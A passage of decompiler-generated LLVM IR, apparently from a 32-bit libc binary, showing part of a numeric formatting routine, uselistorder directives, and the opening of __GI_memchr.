  %v0_804f7e0 = phi i32 [ %v0_804f7c4, %dec_label_pc_804f7c0 ], [ %v0_804f7c4, %dec_label_pc_804f7b9 ], [ %v1_804f7d8, %dec_label_pc_804f7c4 ]
  %v0_804f7db = phi i32 [ %v0_804f7db72, %dec_label_pc_804f7c0 ], [ %v0_804f7db72, %dec_label_pc_804f7b9 ], [ %v0_804f7db.pre, %dec_label_pc_804f7c4 ]
  %v1_804f7db = add i32 %v0_804f7db, 1
  %v8_804f7db = icmp eq i32 %v1_804f7db, 0
  store i32 %v1_804f7db, i32* %ebx.global-to-local, align 4
  br i1 %v8_804f7db, label %dec_label_pc_804f7f5, label %dec_label_pc_804f7de

dec_label_pc_804f7de:                             ; preds = %dec_label_pc_804f7db
  store i32 %v1_804f7db, i32* %eax.global-to-local, align 4
  %v1_804f7e0 = inttoptr i32 %v0_804f7e0 to i32*
  store i32 176, i32* %v1_804f7e0, align 4
  %v0_804f7e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f7e6 = sub i32 0, %v0_804f7e6
  store i32 %v1_804f7e6, i32* %eax.global-to-local, align 4
  %v1_804f7e8 = load i32, i32* @ecx, align 4
  %v2_804f7e8 = add i32 %v1_804f7e8, 4
  %v3_804f7e8 = inttoptr i32 %v2_804f7e8 to i32*
  store i32 %v1_804f7e6, i32* %v3_804f7e8, align 4
  %v0_804f7eb = load i32, i32* @ecx, align 4
  %v1_804f7eb = add i32 %v0_804f7eb, 8
  %v2_804f7eb = inttoptr i32 %v1_804f7eb to i32*
  store i32 ptrtoint (i32* @global_var_80515af.132 to i32), i32* %v2_804f7eb, align 4
  %v0_804f7f2 = load i32, i32* @ecx, align 4
  %v1_804f7f2 = add i32 %v0_804f7f2, 12
  store i32 %v1_804f7f2, i32* @ecx, align 4
  br label %dec_label_pc_804f7f5

dec_label_pc_804f7f5:                             ; preds = %dec_label_pc_804f7db, %dec_label_pc_804f7de
  %v0_804f7f9 = phi i32 [ %v0_804f7e0, %dec_label_pc_804f7db ], [ %v1_804f7f2, %dec_label_pc_804f7de ]
  %v0_804f7f5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f7f5 = icmp eq i32 %v0_804f7f5, 0
  br i1 %v1_804f7f5, label %dec_label_pc_804f808, label %dec_label_pc_804f7f9

dec_label_pc_804f7f9:                             ; preds = %dec_label_pc_804f7f5
  %v1_804f7f9 = inttoptr i32 %v0_804f7f9 to i32*
  store i32 112, i32* %v1_804f7f9, align 4
  %v0_804f7ff = load i32, i32* %edx.global-to-local, align 4
  %v1_804f7ff = load i32, i32* @ecx, align 4
  %v2_804f7ff = add i32 %v1_804f7ff, 4
  %v3_804f7ff = inttoptr i32 %v2_804f7ff to i32*
  store i32 %v0_804f7ff, i32* %v3_804f7ff, align 4
  %v0_804f802 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f802 = load i32, i32* @ecx, align 4
  %v2_804f802 = add i32 %v1_804f802, 8
  %v3_804f802 = inttoptr i32 %v2_804f802 to i32*
  store i32 %v0_804f802, i32* %v3_804f802, align 4
  %v0_804f805 = load i32, i32* @ecx, align 4
  %v1_804f805 = add i32 %v0_804f805, 12
  store i32 %v1_804f805, i32* @ecx, align 4
  br label %dec_label_pc_804f808

dec_label_pc_804f808:                             ; preds = %dec_label_pc_804f7f5, %dec_label_pc_804f7f9
  %v0_804f826 = phi i32 [ %v0_804f7f9, %dec_label_pc_804f7f5 ], [ %v1_804f805, %dec_label_pc_804f7f9 ]
  br i1 %v1_804f622, label %dec_label_pc_804f81c, label %dec_label_pc_804f80f

dec_label_pc_804f80f:                             ; preds = %dec_label_pc_804f808
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v3_804f816 = load i8, i8* %v2_804f7af, align 1
  %v4_804f816 = and i8 %v3_804f816, 16
  %v5_804f816 = icmp eq i8 %v4_804f816, 0
  br i1 %v5_804f816, label %dec_label_pc_804f839, label %dec_label_pc_804f81c

dec_label_pc_804f81c:                             ; preds = %dec_label_pc_804f80f, %dec_label_pc_804f808
  %v0_804f81c = load i32, i32* %edx.global-to-local, align 4
  %v1_804f81e = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f81e = sub i32 %v0_804f81c, %v1_804f81e
  store i32 %v2_804f81e, i32* %eax.global-to-local, align 4
  %v1_804f820 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804f820 = sub i32 %v2_804f81e, %v1_804f820
  %v8_804f820 = xor i32 %v1_804f820, %v2_804f81e
  %v9_804f820 = xor i32 %v2_804f820, %v2_804f81e
  %v10_804f820 = and i32 %v9_804f820, %v8_804f820
  %v11_804f820 = icmp slt i32 %v10_804f820, 0
  %v13_804f820 = icmp slt i32 %v2_804f820, 0
  %v2_804f822 = icmp eq i1 %v13_804f820, %v11_804f820
  br i1 %v2_804f822, label %dec_label_pc_804f839, label %dec_label_pc_804f824

dec_label_pc_804f824:                             ; preds = %dec_label_pc_804f81c
  %v2_804f824 = sub i32 %v1_804f820, %v2_804f81e
  store i32 %v2_804f824, i32* %ebp.global-to-local, align 4
  %v1_804f826 = inttoptr i32 %v0_804f826 to i32*
  store i32 176, i32* %v1_804f826, align 4
  %v0_804f82c = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f82c = load i32, i32* @ecx, align 4
  %v2_804f82c = add i32 %v1_804f82c, 4
  %v3_804f82c = inttoptr i32 %v2_804f82c to i32*
  store i32 %v0_804f82c, i32* %v3_804f82c, align 4
  %v0_804f82f = load i32, i32* @ecx, align 4
  %v1_804f82f = add i32 %v0_804f82f, 8
  %v2_804f82f = inttoptr i32 %v1_804f82f to i32*
  store i32 ptrtoint (i32* @global_var_80515af.132 to i32), i32* %v2_804f82f, align 4
  %v0_804f836 = load i32, i32* @ecx, align 4
  %v1_804f836 = add i32 %v0_804f836, 12
  store i32 %v1_804f836, i32* @ecx, align 4
  br label %dec_label_pc_804f839

dec_label_pc_804f839:                             ; preds = %dec_label_pc_804f81c, %dec_label_pc_804f80f, %dec_label_pc_804f824
  %v1_804f8bc84 = phi i32 [ %v0_804f826, %dec_label_pc_804f81c ], [ %v0_804f826, %dec_label_pc_804f80f ], [ %v1_804f836, %dec_label_pc_804f824 ]
  %v12_804f839 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_804f839, label %dec_label_pc_804f8af, label %dec_label_pc_804f840

dec_label_pc_804f840:                             ; preds = %dec_label_pc_804f839
  %v0_804f847 = load i32, i32* %esi.global-to-local, align 4
  %v2_804f847 = icmp slt i32 %v0_804f847, 0
  %v1_804f849 = trunc i32 %stack_var_-42.0 to i8
  store i32 %v0_804f847, i32* %edx.global-to-local, align 4
  br i1 %v2_804f847, label %dec_label_pc_804f858, label %dec_label_pc_804f84f

dec_label_pc_804f84f:                             ; preds = %dec_label_pc_804f840
  store i32 43, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f861

dec_label_pc_804f858:                             ; preds = %dec_label_pc_804f840
  store i32 45, i32* %edi.global-to-local, align 4
  %v1_804f85f = sub i32 0, %v0_804f847
  store i32 %v1_804f85f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f861

dec_label_pc_804f861:                             ; preds = %dec_label_pc_804f84f, %dec_label_pc_804f858
  %v0_804f87577 = phi i32 [ %v0_804f847, %dec_label_pc_804f84f ], [ %v1_804f85f, %dec_label_pc_804f858 ]
  store i32 0, i32* %stack_var_-27, align 4
  %v2_804f869 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_804f869, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f875

dec_label_pc_804f875:                             ; preds = %dec_label_pc_804f875.backedge, %dec_label_pc_804f861
  %v0_804f883 = phi i32 [ %v0_804f886, %dec_label_pc_804f875.backedge ], [ 2, %dec_label_pc_804f861 ]
  %v0_804f87f = phi i32 [ %v0_804f87f.pre, %dec_label_pc_804f875.backedge ], [ %v2_804f869, %dec_label_pc_804f861 ]
  %v0_804f875 = phi i32 [ %v9_804f87d, %dec_label_pc_804f875.backedge ], [ %v0_804f87577, %dec_label_pc_804f861 ]
  store i32 10, i32* %ebp.global-to-local, align 4
  %v1_804f87c = ashr i32 %v0_804f875, 31
  %v2_804f87d = zext i32 %v0_804f875 to i64
  %v4_804f87d = zext i32 %v1_804f87c to i64
  %v5_804f87d = mul nuw i64 %v4_804f87d, 4294967296
  %v6_804f87d = or i64 %v5_804f87d, %v2_804f87d
  %v8_804f87d = sdiv i64 %v6_804f87d, 10
  %v9_804f87d = trunc i64 %v8_804f87d to i32
  store i32 %v9_804f87d, i32* %eax.global-to-local, align 4
  %v11_804f87d = srem i64 %v6_804f87d, 10
  %v12_804f87d = trunc i64 %v11_804f87d to i8
  %v1_804f87f = add i32 %v0_804f87f, -1
  store i32 %v1_804f87f, i32* %ebx.global-to-local, align 4
  %v1_804f880 = add i8 %v12_804f87d, 48
  %v1_804f883 = add i32 %v0_804f883, 1
  store i32 %v1_804f883, i32* %esi.global-to-local, align 4
  %v3_804f884 = inttoptr i32 %v1_804f87f to i8*
  store i8 %v1_804f880, i8* %v3_804f884, align 1
  %v0_804f886 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v9_804f87d, i32* %edx.global-to-local, align 4
  %v7_804f88b = icmp sgt i32 %v0_804f886, 3
  br i1 %v7_804f88b, label %dec_label_pc_804f88d, label %dec_label_pc_804f875.backedge

dec_label_pc_804f88d:                             ; preds = %dec_label_pc_804f875
  %v2_804f88d = icmp eq i32 %v9_804f87d, 0
  %v1_804f88f = icmp eq i1 %v2_804f88d, false
  br i1 %v1_804f88f, label %dec_label_pc_804f875.backedge, label %dec_label_pc_804f891

dec_label_pc_804f875.backedge:                    ; preds = %dec_label_pc_804f88d, %dec_label_pc_804f875
  %v0_804f87f.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f875

dec_label_pc_804f891:                             ; preds = %dec_label_pc_804f88d
  %v0_804f891 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804f891, i32* %edx.global-to-local, align 4
  %v0_804f893 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f893 = add i32 %v0_804f893, -2
  store i32 %v1_804f893, i32* %eax.global-to-local, align 4
  %v1_804f896 = trunc i32 %v0_804f891 to i8
  %v3_804f896 = add i32 %v0_804f893, -1
  %v4_804f896 = inttoptr i32 %v3_804f896 to i8*
  store i8 %v1_804f896, i8* %v4_804f896, align 1
  %v5_804f899 = load i32, i32* %edx.global-to-local, align 4
  %v6_804f899 = and i32 %v5_804f899, -256
  %v7_804f899 = or i32 %v6_804f899, %stack_var_-42.0
  store i32 %v7_804f899, i32* %edx.global-to-local, align 4
  %v2_804f89d = load i32, i32* %ebx.global-to-local, align 4
  %v3_804f89d = add i32 %v2_804f89d, -2
  %v4_804f89d = inttoptr i32 %v3_804f89d to i8*
  store i8 %v1_804f849, i8* %v4_804f89d, align 1
  %v0_804f8a0 = load i32, i32* @ecx, align 4
  %v1_804f8a0 = inttoptr i32 %v0_804f8a0 to i32*
  store i32 112, i32* %v1_804f8a0, align 4
  %v0_804f8a6 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f8a6 = load i32, i32* @ecx, align 4
  %v2_804f8a6 = add i32 %v1_804f8a6, 4
  %v3_804f8a6 = inttoptr i32 %v2_804f8a6 to i32*
  store i32 %v0_804f8a6, i32* %v3_804f8a6, align 4
  %v0_804f8a9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f8a9 = load i32, i32* @ecx, align 4
  %v2_804f8a9 = add i32 %v1_804f8a9, 8
  %v3_804f8a9 = inttoptr i32 %v2_804f8a9 to i32*
  store i32 %v0_804f8a9, i32* %v3_804f8a9, align 4
  %v0_804f8ac = load i32, i32* @ecx, align 4
  %v1_804f8ac = add i32 %v0_804f8ac, 12
  store i32 %v1_804f8ac, i32* @ecx, align 4
  br label %dec_label_pc_804f8af

dec_label_pc_804f8af:                             ; preds = %dec_label_pc_804f839, %dec_label_pc_804f4d4, %dec_label_pc_804f891
  %v0_804f930 = phi i32 [ %v1_804f8bc84, %dec_label_pc_804f839 ], [ %v2_804f4dc, %dec_label_pc_804f4d4 ], [ %v1_804f8ac, %dec_label_pc_804f891 ]
  %v2_804f8af = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_804f8af, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f8b3

dec_label_pc_804f8b3:                             ; preds = %dec_label_pc_804f8b3, %dec_label_pc_804f8af
  %v0_804f8b3 = phi i32 [ %v2_804f8af, %dec_label_pc_804f8af ], [ %v1_804f8b5, %dec_label_pc_804f8b3 ]
  %stack_var_-216.0 = phi i32 [ %v3_804f3c7, %dec_label_pc_804f8af ], [ %v5_804f8b8, %dec_label_pc_804f8b3 ]
  %v1_804f8b3 = inttoptr i32 %v0_804f8b3 to i32*
  %v2_804f8b3 = load i32, i32* %v1_804f8b3, align 4
  store i32 %v2_804f8b3, i32* %edx.global-to-local, align 4
  %v1_804f8b5 = add i32 %v0_804f8b3, 12
  store i32 %v1_804f8b5, i32* %eax.global-to-local, align 4
  %v5_804f8b8 = sub i32 %stack_var_-216.0, %v2_804f8b3
  %v7_804f8bc = icmp ult i32 %v1_804f8b5, %v0_804f930
  br i1 %v7_804f8bc, label %dec_label_pc_804f8b3, label %dec_label_pc_804f8c0

dec_label_pc_804f8c0:                             ; preds = %dec_label_pc_804f8b3
  %v5_804f8c9 = icmp eq i8 %stack_var_-26.0, 0
  %v1_804f8d9 = icmp eq i1 %v5_804f8c9, false
  %v2_804f8d9 = zext i1 %v1_804f8d9 to i32
  %v2_804f8dc = sub i32 %v5_804f8b8, %v2_804f8d9
  store i32 %v2_804f8dc, i32* %edx.global-to-local, align 4
  store i32 160, i32* %stack_var_-168, align 4
  store i32 %v2_804f8dc, i32* %eax.global-to-local, align 4
  store i32 %v0_804f930, i32* %esi.global-to-local, align 4
  %tmp141 = icmp slt i32 %v2_804f8dc, 1
  br i1 %tmp141, label %dec_label_pc_804f932, label %dec_label_pc_804f8f2

dec_label_pc_804f8f2:                             ; preds = %dec_label_pc_804f8c0
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v2_804f8f9 = inttoptr i32 %v1_804f407 to i8*
  %v3_804f8f9 = load i8, i8* %v2_804f8f9, align 1
  %v4_804f8f9 = and i8 %v3_804f8f9, 8
  %v5_804f8f9 = icmp eq i8 %v4_804f8f9, 0
  br i1 %v5_804f8f9, label %dec_label_pc_804f914, label %dec_label_pc_804f8ff

dec_label_pc_804f8ff:                             ; preds = %dec_label_pc_804f8f2
  %v1_804f8ff = add i32 %v0_804f930, 12
  store i32 %v1_804f8ff, i32* %esi.global-to-local, align 4
  %v1_804f902 = inttoptr i32 %v0_804f930 to i32*
  store i32 160, i32* %v1_804f902, align 4
  %v0_804f908 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f908 = load i32, i32* @ecx, align 4
  %v2_804f908 = add i32 %v1_804f908, 4
  %v3_804f908 = inttoptr i32 %v2_804f908 to i32*
  store i32 %v0_804f908, i32* %v3_804f908, align 4
  %v0_804f90b = load i32, i32* @ecx, align 4
  %v1_804f90b = add i32 %v0_804f90b, 8
  %v2_804f90b = inttoptr i32 %v1_804f90b to i32*
  store i32 ptrtoint (i32* @global_var_80515af.132 to i32), i32* %v2_804f90b, align 4
  br label %dec_label_pc_804f932

dec_label_pc_804f914:                             ; preds = %dec_label_pc_804f8f2
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_804f91b = add i32 %tmp112, 16
  %v2_804f91b = inttoptr i32 %v1_804f91b to i32*
  %v3_804f91b = load i32, i32* %v2_804f91b, align 4
  %v9_804f91b = icmp eq i32 %v3_804f91b, 48
  %v1_804f91f = icmp eq i1 %v9_804f91b, false
  br i1 %v1_804f91f, label %dec_label_pc_804f92c, label %dec_label_pc_804f921

dec_label_pc_804f921:                             ; preds = %dec_label_pc_804f914
  %v3_804f921 = load i32, i32* %stack_var_-152, align 4
  %v5_804f921 = add i32 %v3_804f921, %v2_804f8dc
  store i32 %v5_804f921, i32* %stack_var_-152, align 4
  br label %dec_label_pc_804f930

dec_label_pc_804f927:                             ; preds = %dec_label_pc_804f938
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f95f

dec_label_pc_804f92c:                             ; preds = %dec_label_pc_804f914
  br label %dec_label_pc_804f930

dec_label_pc_804f930:                             ; preds = %dec_label_pc_804f921, %dec_label_pc_804f92c
  store i32 %v0_804f930, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f932

dec_label_pc_804f932:                             ; preds = %dec_label_pc_804f8c0, %dec_label_pc_804f8ff, %dec_label_pc_804f930
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_804f934 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_804f934, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f938

dec_label_pc_804f938:                             ; preds = %dec_label_pc_804f956, %dec_label_pc_804f932
  call void @__pseudo_call(i32 %tmp112)
  %v0_804f951 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f951 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f951 = add i32 %v1_804f951, 4
  %v3_804f951 = inttoptr i32 %v2_804f951 to i32*
  %v4_804f951 = load i32, i32* %v3_804f951, align 4
  %v15_804f951 = icmp eq i32 %v0_804f951, %v4_804f951
  %v1_804f954 = icmp eq i1 %v15_804f951, false
  br i1 %v1_804f954, label %dec_label_pc_804f927, label %dec_label_pc_804f956

dec_label_pc_804f956:                             ; preds = %dec_label_pc_804f938
  %v1_804f956 = add i32 %v1_804f951, 12
  store i32 %v1_804f956, i32* %ebx.global-to-local, align 4
  %v0_804f959 = load i32, i32* %edi.global-to-local, align 4
  %v2_804f959 = add i32 %v0_804f959, %v0_804f951
  store i32 %v2_804f959, i32* %edi.global-to-local, align 4
  %v1_804f95b = load i32, i32* %esi.global-to-local, align 4
  %v7_804f95b = icmp ult i32 %v1_804f956, %v1_804f95b
  br i1 %v7_804f95b, label %dec_label_pc_804f938, label %dec_label_pc_804f95f

dec_label_pc_804f95f:                             ; preds = %dec_label_pc_804f956, %dec_label_pc_804f927
  %v0_804f965 = phi i32 [ -1, %dec_label_pc_804f927 ], [ %v2_804f959, %dec_label_pc_804f956 ]
  store i32 %v0_804f965, i32* %eax.global-to-local, align 4
  %v2_804f968 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f968, i32* @esi, align 4
  store i32 %v0_804f3aa, i32* @edi, align 4
  store i32 %v0_804f3a9, i32* @ebp, align 4
  ret i32 %v0_804f965

; uselistorder directives
  uselistorder i32 %v0_804f965, { 1, 0 }
  uselistorder i32 %v1_804f8b5, { 1, 2, 0 }
  uselistorder i32 %v0_804f8b3, { 1, 0 }
  uselistorder i32 %v0_804f930, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v0_804f886, { 1, 0 }
  uselistorder i32 %v9_804f87d, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804f875, { 1, 0 }
  uselistorder i32 %v0_804f847, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804f820, { 1, 0 }
  uselistorder i32 %v1_804f820, { 1, 0, 2 }
  uselistorder i32 %v2_804f81e, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_804f754, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804f73a, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_804f79f, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v0_804f705, { 0, 2, 1 }
  uselistorder i32 %v1_804f6de, { 1, 0 }
  uselistorder i32 %v0_804f6d9, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804f6a6, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_804f6a1, { 1, 0 }
  uselistorder i8 %v2_804f69a, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_804f69a, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804f624, { 1, 2, 0 }
  uselistorder i8 %stack_var_-206.1, { 3, 1, 4, 0, 2 }
  uselistorder i8 %v4_804f609, { 1, 0 }
  uselistorder i32 %v1_804f5f5, { 1, 0 }
  uselistorder i32 %v0_804f5e9, { 1, 0 }
  uselistorder i32 %v4_804f5d0, { 1, 0 }
  uselistorder i32 %tmp149, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_804f5d5, { 1, 0 }
  uselistorder i32 %v2_804f593, { 1, 0, 2 }
  uselistorder i3 %v1_804f449, { 1, 0 }
  uselistorder i8 %v4_804f4c8, { 1, 0 }
  uselistorder i32 %v3_804f407, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_804f407, { 1, 0, 2 }
  uselistorder i8 %stack_var_-206.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i32 %v1_804f3d9, { 1, 0 }
  uselistorder i32 %v3_804f3c7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp112, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 1, 2, 4, 3 }
  uselistorder x86_fp80* %st1.global-to-local, { 1, 0, 2 }
  uselistorder x86_fp80* %st0.global-to-local, { 3, 0, 1, 2 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 4, 5, 6, 7, 1, 8, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12, 13, 14, 15 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 5, 6, 9, 13, 12, 14, 10, 11, 15, 18, 16, 19, 17, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 23, 10, 11, 24, 13, 14, 12, 18, 15, 16, 17, 19, 20, 21, 22 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 2, 7, 8, 3, 9, 6, 4, 10, 5, 11 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 4, 5, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i8 8, { 3, 4, 2, 5, 6, 0, 7, 8, 1 }
  uselistorder i32 160, { 2, 1, 0, 3 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i64 4294967296, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 45, { 4, 0, 5, 1, 3, 2 }
  uselistorder i32 43, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i8 16, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 176, { 1, 2, 0, 3 }
  uselistorder i32 112, { 4, 5, 6, 2, 0, 1, 3 }
  uselistorder i8 48, { 12, 14, 2, 3, 6, 5, 4, 7, 8, 9, 10, 0, 11, 1, 13 }
  uselistorder i32* @esp, { 22, 5, 23, 24, 25, 26, 6, 27, 28, 29, 30, 31, 8, 32, 33, 34, 10, 35, 11, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 9, 48, 12, 49, 50, 51, 13, 52, 53, 54, 55, 56, 57, 58, 59, 7, 60, 0, 1, 61, 62, 63, 64, 65, 66, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 20, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 16, 108, 109, 110, 17, 111, 14, 112, 113, 114, 115, 116, 117, 18, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 15, 131, 132, 133, 134, 135, 136, 19, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 2, 3, 4, 82, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 21, 83, 84, 85, 86, 158, 159, 160, 161, 162, 163, 164 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 1, 2, 4, 7, 5, 6, 9, 8, 3 }
  uselistorder i8 102, { 4, 1, 0, 3, 2 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 101, { 1, 0, 2 }
  uselistorder i32 48, { 0, 9, 6, 3, 1, 7, 8, 13, 14, 15, 16, 18, 17, 4, 10, 5, 2, 19, 20, 12, 11 }
  uselistorder i32 10, { 17, 9, 8, 13, 1, 11, 0, 14, 2, 23, 24, 25, 26, 27, 28, 3, 18, 19, 21, 20, 4, 6, 29, 7, 16, 22, 10, 30, 15, 31, 32, 12, 5 }
  uselistorder i32 9, { 6, 7, 12, 8, 9, 10, 11, 13, 14, 15, 16, 3, 1, 5, 4, 2, 0 }
  uselistorder i16 256, { 0, 3, 1, 2 }
  uselistorder i32 -65536, { 2, 3, 4, 5, 1, 0, 6, 7, 8 }
  uselistorder i32 68, { 0, 3, 4, 1, 5, 2 }
  uselistorder i8 32, { 7, 0, 1, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 10, 2, 5, 3, 6, 4 }
  uselistorder i32 12, { 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 45, 32, 46, 33, 0, 1, 34, 35, 6, 7, 36, 2, 95, 47, 48, 49, 3, 50, 16, 37, 96, 51, 52, 62, 18, 17, 8, 53, 9, 10, 11, 12, 13, 14, 15, 21, 38, 55, 54, 39, 40, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 19, 94, 56, 57, 58, 59, 41, 42, 4, 20, 43, 44, 60, 5, 61 }
  uselistorder i32 6, { 10, 11, 12, 13, 1, 0, 2, 14, 15, 3, 4, 5, 9, 7, 8, 6, 16 }
  uselistorder i32 32, { 36, 16, 37, 38, 19, 39, 40, 41, 42, 43, 44, 45, 0, 46, 47, 29, 50, 20, 51, 52, 18, 22, 53, 54, 55, 65, 66, 56, 57, 32, 58, 59, 60, 30, 31, 67, 23, 35, 49, 17, 2, 1, 3, 4, 33, 5, 48, 6, 7, 8, 9, 10, 11, 21, 13, 12, 25, 27, 15, 14, 26, 61, 62, 63, 64, 28, 24, 34 }
  uselistorder label %dec_label_pc_804f932, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f930, { 1, 0 }
  uselistorder label %dec_label_pc_804f8af, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f861, { 1, 0 }
  uselistorder label %dec_label_pc_804f839, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f808, { 1, 0 }
  uselistorder label %dec_label_pc_804f7f5, { 1, 0 }
  uselistorder label %dec_label_pc_804f7db, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f7a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f793, { 1, 0 }
  uselistorder label %dec_label_pc_804f788, { 1, 0 }
  uselistorder label %dec_label_pc_804f70f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f701, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f6c7, { 1, 0 }
  uselistorder label %dec_label_pc_804f697.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804f663, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f632, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f61d, { 1, 0 }
  uselistorder label %dec_label_pc_804f4d4, { 1, 0 }
  uselistorder label %dec_label_pc_804f3f8, { 1, 0 }
  uselistorder label %dec_label_pc_804f3ef, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_804f96c = load i32, i32* @edi, align 4
  store i32 %v0_804f96c, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_804f973 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f973, i32* %edi.global-to-local, align 4
  %v1_804f97b = icmp eq i32 %arg3, 0
  store i1 %v1_804f97b, i1* %zf.global-to-local, align 1
  br i1 %v1_804f97b, label %dec_label_pc_804f98b, label %dec_label_pc_804f97f

dec_label_pc_804f97f:                             ; preds = %entry
  %v2_804f97f = call i32 @_strlen(i8* %arg1)
  %v3_804f97f = mul i32 %v2_804f97f, -1
  %v4_804f97f = add i32 %v3_804f97f, -2
  store i32 %v4_804f97f, i32* @ecx, align 4
  %v0_804f981 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804f981, label %dec_label_pc_804f97f.dec_label_pc_804f988_crit_edge, label %dec_label_pc_804f983

dec_label_pc_804f97f.dec_label_pc_804f988_crit_edge: ; preds = %dec_label_pc_804f97f
  %v0_804f988.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_804f988.pre, -1
  br label %dec_label_pc_804f988

dec_label_pc_804f983:                             ; preds = %dec_label_pc_804f97f
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f988

